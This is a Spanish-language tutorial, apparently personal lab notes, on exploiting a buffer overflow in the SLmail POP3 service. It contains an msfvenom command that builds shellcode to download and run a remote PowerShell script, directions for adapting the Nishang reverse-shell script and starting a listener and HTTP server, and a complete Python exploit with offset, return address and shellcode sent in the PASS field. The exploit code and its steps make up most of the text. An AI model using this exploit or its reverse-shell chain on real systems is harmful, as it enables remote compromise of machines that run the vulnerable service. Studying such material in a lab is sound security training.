Imaginemos que queremos ejecutar un comando en especificifico para eso podemos utilizar payloads como “**windows/exec**” para cargar directamente el comando que se desea ejecutar en la variable **CMD** del payload. Esto permite crear un nuevo shellcode que, una vez interpretado, ejecutará directamente la instrucción deseada entonces podemos utlizar la siguiente estructura de comando

```bash
msfvenom -p windows/exec CMD="<comando>" --platform so -a estructura -e encoder -b badchars EXITFUNC=threads
```

Entonces sabiendo esto podemos hacer tratar de ejecutar este comando 


![[Pasted image 20240310195914.png]]

Este comando nos generaria un shellcode que ejecuta un comando PowerShell para descargar y ejecutar un script remoto en un sistema Windows entonces lo que podemos incluir en este script que va a ejecutar la maquina windows es una reverse shell la base del script que vamos a utlizar se encuentra en este link https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1  con este ya descargado y con el nombre que indicamos al hacer el shellcode hacemos una leve modificacion la cual es copiar la siguiente parte del codigo


![[Pasted image 20240310212530.png]]


Y ahora la pegamos justo al final del script y especificamos la direccion ip y puerto desde el que estas en escucha esto lo indicarias en esta parte 


![[Pasted image 20240310201947.png]]

Ahora los siguiente que tendrimaos que hacer es montarno un servidor en la maquina atacante con la ayuda de python 

![[Pasted image 20240310213029.png]]

Seguidamente nos ponemos en escucha desdes la maquina atacante por el puerto especificado en el script

![[Pasted image 20240310213138.png]]


Entonces ahora generamos nuestro shellcode con el comando que vimos anteriormente 

![[Pasted image 20240310213309.png]]

Este nos lo copiamos y lo integramos en nuestro exploit por lo que ya modificado quedaria de la siguiente manera


```python
#!/usr/bin/python3.11
from struct import pack

import sys
import socket

ip = "192.168.0.2"
port = 110


offset=4655

before_eip=b"A"*offset

eip=pack("<L",0x5f4c4d13)

shellcode=(b"\xda\xd7\xd9\x74\x24\xf4\xba\xf1\x92\xa3\x55\x5e\x33\xc9"
b"\xb1\x44\x31\x56\x1a\x03\x56\x1a\x83\xee\xfc\xe2\x04\x6e"
b"\x4b\xd7\xe6\x8f\x8c\xb8\x6f\x6a\xbd\xf8\x0b\xfe\xee\xc8"
b"\x58\x52\x03\xa2\x0c\x47\x90\xc6\x98\x68\x11\x6c\xfe\x47"
b"\xa2\xdd\xc2\xc6\x20\x1c\x16\x29\x18\xef\x6b\x28\x5d\x12"
b"\x81\x78\x36\x58\x37\x6d\x33\x14\x8b\x06\x0f\xb8\x8b\xfb"
b"\xd8\xbb\xba\xad\x53\xe2\x1c\x4f\xb7\x9e\x15\x57\xd4\x9b"
b"\xec\xec\x2e\x57\xef\x24\x7f\x98\x43\x09\x4f\x6b\x9a\x4d"
b"\x68\x94\xe9\xa7\x8a\x29\xe9\x73\xf0\xf5\x7c\x60\x52\x7d"
b"\x26\x4c\x62\x52\xb0\x07\x68\x1f\xb7\x40\x6d\x9e\x14\xfb"
b"\x89\x2b\x9b\x2c\x18\x6f\xbf\xe8\x40\x2b\xde\xa9\x2c\x9a"
b"\xdf\xaa\x8e\x43\x45\xa0\x23\x97\xf4\xeb\x29\x66\x8b\x91"
b"\x1c\x68\x93\x99\x30\x01\xa2\x12\xdf\x56\x3b\xf1\x9b\xb9"
b"\xde\xd0\xd1\x51\x46\xb1\x5b\x3c\x79\x6f\x9f\x39\xf9\x9a"
b"\x60\xbe\xe1\xee\x65\xfa\xa6\x03\x14\x93\x42\x24\x8b\x94"
b"\x47\x54\x44\x1c\x02\xe7\xe9\x8a\xa9\x6b\x62\x6b\x78\x31"
b"\x22\x43\x34\xdc\xa5\xbe\x87\x7c\x20\xa4\x74\xf5\x94\x68"
b"\x1f\x81\xfa\x23\xba\x0b\x40\xa0\x2d\xa9\x28\x4c\x84\x1f"
b"\xd1\xc3\xa1\x31\x75\x73\x2c\xaa\xd6\xff\xdc\x5b\xb7\x98"
b"\x08\xbb\x2f\x13\x3c\xb3\x95\xf4\x93\x02\xd3\x38\xc5\x55"
b"\x15\x05\x37\xa6\x77\x44\x75\xfe\xa8\xf6\x2a\xd0\xc6\x85"
b"\xfd\x0b\x0e\x6a")


payload=before_eip+eip+b"\x83\xEC\x10"+shellcode 

def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)

    s.send(b"USER tumbaburras" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS" + payload + b'\r\n')


    s.close

if __name__ == '__main__':

    exploit()




```


Entonces antes de todo reiniciamos el servicio de SLmail y ya reiniciado entonces ahora si podemos ejecutar el exploit

![[Pasted image 20240310215706.png]]

Entonces ahora podemos ver que se ha realizado una peticion por el metodo get al recurso que indicamos y aparte hemos ganado acceso a la maquina

![[Pasted image 20240310220046.png]]

Y listo hemos logrado comprometeer la maquina y hemos logrado explotar exitosamente el buffer overflow


Por ultimo a modo de consejo puede que haya ocasiones en las que tengamos muchos badchars y a lo mejor el encoder shikata ga nai no es capaz de generate un shellcode que no tenga estos badchars asi que simplemtente borramos donde especificamos el encoder

![[Pasted image 20240310220851.png]]

